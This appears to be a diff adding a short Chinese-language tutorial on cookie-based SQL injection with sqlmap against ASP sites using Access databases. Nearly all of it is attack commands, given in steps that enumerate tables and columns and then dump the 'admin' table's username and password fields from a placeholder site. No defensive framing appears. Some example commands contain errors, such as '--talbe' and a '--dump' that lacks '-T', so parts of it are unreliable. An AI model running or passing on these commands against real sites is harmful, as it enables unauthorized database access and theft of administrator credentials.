@@ -1,0 +1,29 @@
+
+
+                                           作者：拿破飞机
+---------------------------------------------------------------------------------------------
+
+注：此方法使用于access数据库，mysql、MSSQL数据库请在第二步获取站点当前数据库及数据库，方法与常规mysql、MSSQL注入一样，只不过在后面加上了“--level 2”这个参数，其他参数照常使用。
+
+1.判断数据库，获取服务器，网站环境等参数
+
+sqlmap.py -u http://www.xx.com/show.asp --cookie "id=187" --table --level 2
+
+例：
+sqlmap.py -u "http://www.xx.com/show.asp" --cookie "id=187" --talbe --level 2
+
+
+2.获取字段
+
+sqlmap.py -u http://www.xx.com/show.asp --cookie "id=187" --columns -T 数据表 --level 2
+
+例：
+sqlmap.py -u "http://www.xx.com/show.asp" --cookie "id=187" --columns -T admin --level 2
+
+
+3.获取字段中的内容
+
+sqlmap.py -u http://www.xx.com/show.asp --cookie "id=187" --dump -T 表名 -C "字段名1,字段名2"  --level 2
+
+例：
+sqlmap.py -u "http://www.xx.com/show.asp" --cookie "id=187" --dump admin -C "username,password" --level 2
